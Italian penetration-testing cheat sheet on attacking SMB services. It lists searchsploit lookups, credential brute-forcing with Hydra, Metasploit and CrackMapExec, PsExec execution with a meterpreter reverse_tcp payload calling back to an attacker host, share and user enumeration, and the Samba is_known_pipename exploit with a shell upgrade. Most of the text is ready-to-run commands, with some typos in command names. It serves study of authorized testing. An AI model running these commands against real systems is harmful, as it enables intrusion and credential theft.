<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
## Ricerca Exploit noti
Dopo aver effettuata la scansione del servizio e la sua versione nella fase di Scansione ed Enumerazione, possiamo procedere con la ricerca di exploit noti usando <a href="https://www.exploit-db.com/">Ecploit Database</a> oppure: 
```bash
searchsploit <smb-versione> 
```
> Se restituise un exploit utilizzabile, copia il path e usa `searchsploit -m <path>`

Versioni vulnerabili comuni:
- **SMBv1** ⟶ EternalBlue (MS17-010)
- **Windows XP/2003/7 non patchati** ⟶ buffer overflow
- **vsrvsvc** ⟶ vulnerabilità RPC

Versioni SMB:
- **SMB 1.0** ⟶ insicuro, supporta accessi anonimi, molte vulnerabilità.
- **SMB 2.0/2.1** ⟶ introdotti con Windows Vista e Server 2008, migliorie in sicurezza e prestazioni.
- **SMB 3.0+** ⟶ da Windows 8 in poi, supporto crittografia, multicanale, virtualizzazione.

---

## Brute Force
Molto probabilmente il servizio sará protetto da credenziali e quindi cerchiamo di trovare con un attacco bruteforce
### Hydra
```bash
hydra -L <userList> -P <passwordList> <IP> smb
```

### Metasploit
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <IP>
set USER_FILE <user_list>
set PASS_FILE <pass_list>
run
```

### CrackMapExec
strumento da riga di comando scritto in Python, progettato per automatizzare la ricognizione e l’attacco a reti Windows, in particolare in ambienti Active Directory. 
```bash
crackmapexec smb <target> -u <userList> -p <passwordList>
#dopo aver ottenuto delle credenziali
crackmapexec smb <target> -u <username> -p <password> --shares     # elenca condivisioni
crackmapexec smb -u <username> -p <password> <target> --users      # enumera utenti
crackmapexec smb -u <username> -p <password> <target> -x "whoami"  # esegue un comando
```
> È potente, ma anche rumoroso nei log di rete: in un test reale, valuta il rischio di account lockout e allarmi SIEM

---

## PsExec (Metasploit)
Dopo aver scovato delle credenziali possiamo usare uno strumento sviluppato da Sysinternals (Microsoft) che permette di eseguire comandi su un sistema Windows remoto come se li stessi eseguendo in locale.
> Attenzione percè funziona solo con credenziali di livello amministrativo e valide (`ADMIN$`, `IPC$`)
```bash
use exploit/windows/smb/psexec
set RHOSTS <IP>
set SMBUser <username>
set SMBPass <password>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <KaliIP>
set LPORT <Port>
run
```
## PsExec (Script)
Esiste anche uno script incluso nel pacchetto Impacket, che replica il comportamento di PsExec di Sysinternals
```basg
psexec.py <username>@<IP> cmd.exe # accesso CMD remoto via SMB
```
Percorso tipico: 
```bash
/usr/share/doc/python3-impacket/examples/psexec.py
```

---


## Enumerazione interna
Per poter enumerare bene, si deve andare piú a fondo e quindi esistono diversi strumenti, ognuno con caratteristiche specifiche che li rendono adatti a compiti complementari
### smbclient
strumento da riga di comando incluso nel pacchetto Samba (su Linux), che permette di connettersi a condivisioni SMB/CIFS su server Windows, Linux o Samba.
```bash
smbclient -L //<target>/ -N                    # condivisioni anonime
smbclient -L <IP> -U <username>                # share disponibili per utente
smbclient //<target>/<share> -U <username>     # accesso alla share, inserisci la password in seguito
```
Comandi interni:
- `?`, `ls`, `get <file>`, `put <file>`, `cd`, `mkdir`, `rmdir`
> File come `*.tar.gz` possono essere estratti con `tar xzf file.tar.gz`

### rpcclient
strumento da riga di comando incluso nel pacchetto Samba, che consente di interagire con i servizi RPC (Remote Procedure Call) dei sistemi Windows.
```bash
rpcclient -U "" <IP>                # connessione null session
rpcclient -U utente <IP>            # connessione usando le credenziali
rpcclient -U utente%password <IP>   # connessione con credenziali insieme
```
Comandi dentro RPC CLient: 
```bash
enumdomusers      # elenca tutti gli utenti del dominio o del sistema locale
enumdomgroups     # elenca tutti i gruppi definiti nel dominio o nella macchina locale
queryuser <RID>   # Permette di ottenere informazioni dettagliate su un singolo utente, partendo dal suo RID
```

### smbmap
strumento da riga di comando scritto in Python che serve per enumerare le condivisioni SMB su sistemi Windows o Samba, e capire che tipo di accesso ha un determinato utente (lettura, scrittura, esecuzione, ecc.).
```bash
smbap -H <IP>
# ma se forniamo delle credenziali ottiene piú dettagli
smbmap -H <IP> -u <username> -p <password>
```
> `R` = lettura <br>
> `W` = scrittura <br>
> `-` = nessun accesso <br>

### enum4linux
strumento da riga di comando, basato su `smbclient`, `rpcclient`, `nmblookup`, usato per enumerare informazioni da sistemi Windows o Samba tramite SMB. Permette di raccogliere dati come utenti, gruppi, condivisioni di rete, nomi NetBIOS, domini, SID e molto altro, anche senza credenziali, sfruttando chiamate RPC e SMB.
```bash
enum4linux <IP>
# ma se forniamo delle credenziali ottiene piú dettagli
enum4linux -u <user> -p <password> <IP>
```

---

## Exploits
Altri exploit utilizzabili sono:
### Linux
```bash
use exploit/linux/samba/is_known_pipename
set RHOST <IP>
check
run
```
otterremo una shell unix sul target.
> se abbiamo delle informazioni su delle share possiamo settare `SMB_SHARE_NAME` con il nome della share nota.

se volessimo upgradare la shell con meterpeteer, usiamo il modulo
```bash
use post/multi/menage/shell_to_meterpreter
set LHOST <IP>
set SESSION <number>
run
```
oppure 
```bash
sessions -u <number>
```
ottenendo un altra sessione meterpeter
```bash
sessions 
```

---

